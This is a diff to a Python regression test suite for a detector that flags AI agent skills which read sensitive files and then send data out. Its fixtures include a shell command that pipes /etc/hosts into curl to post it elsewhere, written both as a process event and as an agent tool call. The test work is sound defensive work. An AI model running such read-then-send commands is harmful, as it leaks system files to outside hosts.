@@ -15,6 +15,7 @@ from app.runner.models import (
     ToolCallEvent,
     TraceArtifacts,
 )
+from app.telemetry.normalizer import build_normalized_events
 
 
 PROJECT_ROOT = Path(__file__).resolve().parents[1]
@@ -89,6 +90,37 @@ class DynamicDecisionRegressionTests(unittest.TestCase):
         self.assertIn("sensitive_file_read", result["detected_behaviors"])
         self.assertIn("read_then_exfiltration", result["detected_behaviors"])
         self.assertEqual(result["root_cause_detail"], "unsafe_dataflow_design")
+
+        normalized = build_normalized_events(execution)
+        taint_sinks = [event for event in normalized if event.event_type == "taint_sink"]
+        self.assertTrue(taint_sinks)
+        self.assertEqual(taint_sinks[0].metadata["evidence_level"], "confirmed")
+
+    def test_sensitive_read_then_unrelated_network_is_candidate_only(self) -> None:
+        execution = _execution(
+            skill_dir=DATASETS_ROOT / "malicious" / "malicious_sensitive_exfil_direct",
+            file_events=[
+                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/hosts", action="read", raw="read"),
+            ],
+            network_events=[
+                NetworkEvent(timestamp="2026-01-01T00:00:02Z", address="https://example.com/ping", action="connect", raw="connect"),
+            ],
+            process_events=[],
+            tool_calls=[
+                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_hosts", "Read Sensitive Hosts", "read_file", {"path": "/etc/hosts"}),
+                _tool_call("2026-01-01T00:00:01Z", "send_hosts", "Send Hosts", "http_request", {"method": "POST", "url": "https://example.com/ping", "body": "{\"ok\": true}"}),
+            ],
+        )
+        execution.skill_path = str(DATASETS_ROOT / "benign" / "benign_public_fetch")
+
+        result = analyze_trace(execution, analysis_mode="rule_plus_epg")
+        normalized = build_normalized_events(execution)
+
+        self.assertEqual(result["final_decision"], "benign")
+        self.assertIn("sensitive_file_read", result["detected_behaviors"])
+        self.assertNotIn("read_then_exfiltration", result["detected_behaviors"])
+        self.assertFalse([event for event in normalized if event.event_type == "taint_sink"])
+        self.assertTrue([event for event in normalized if event.event_type == "candidate_dependency"])
 
     def test_staged_exfiltration_through_relay_artifact_still_alerts(self) -> None:
         execution = _execution(
@@ -455,11 +487,11 @@ class DynamicDecisionRegressionTests(unittest.TestCase):
                 ),
             ],
             process_events=[
-                ProcessEvent(timestamp="2026-01-01T00:00:02Z", action="execve", command="curl payload", raw="execve", pid="321"),
+                ProcessEvent(timestamp="2026-01-01T00:00:02Z", action="execve", command="cat /etc/hosts | curl -d @- payload", raw="execve", pid="321"),
             ],
             tool_calls=[
                 _tool_call("2026-01-01T00:00:00Z", "read_sensitive_hosts", "Read Sensitive Hosts", "read_file", {"path": "/etc/hosts"}),
-                _tool_call("2026-01-01T00:00:01Z", "send_hosts", "Send Hosts", "run_command", {"shell": True, "command": "curl payload"}),
+                _tool_call("2026-01-01T00:00:01Z", "send_hosts", "Send Hosts", "run_command", {"shell": True, "command": "cat /etc/hosts | curl -d @- payload"}),
             ],
         )
 
